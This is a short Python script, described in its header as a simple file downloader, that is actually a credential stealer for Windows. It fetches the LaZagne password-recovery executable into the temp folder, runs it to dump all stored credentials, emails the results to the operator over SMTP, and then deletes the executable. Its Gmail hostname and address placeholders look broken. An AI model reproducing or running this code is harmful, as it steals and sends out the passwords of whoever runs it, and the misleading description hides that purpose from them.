#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 04-07-2020
# Last Updated: 04-07-2020
# Operating System: Windows
# Description: Downloads files from a given url

# Import necessary libraries
import requests, subprocess, smtplib, os, tempfile


# Define a function that downloads files from a given url
def download(url):
	# Get the response to the 'get' request to the url
	get_response = requests.get(url)
	# Name the files as per the extension of the file from the url
	file_name = url.split("/")[-1]
	# Write the contents of the url to a file
	with open(file_name, "wb") as jpg_file:
		jpg_file.write(get_response.content)


# Define a function that sends an email
def send_mail(email_id, passwd, msg):
    # Create an instance of the SMTP server (here, a gmail SMTP server is created)
    server = smtplib.SMTP("smtp-mail.gmail.com", 587)
    # Initiate a TLS connection using the created server
    server.starttls()
    # Login to your gmail address
    server.login(email_id, passwd)
    # Send the mail (sender_id, receiver_id, message)
    server.sendmail(email_id, email_id, msg)
    # Quit the server
    server.quit()


# Locate and download the file to a temporary location
temp_directory = tempfile.gettempdir()
type(temp_directory)
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

# Insert the commands
command = "lazagne.exe all"
result =  subprocess.check_output(command, shell=True)
# Send the details to the e-mail
send_mail(<YOUR_EMAIL_ADDRESS>, <PASSWORD>, result)

# Delete the downloaded file after execution
os.remove("lazagne.exe")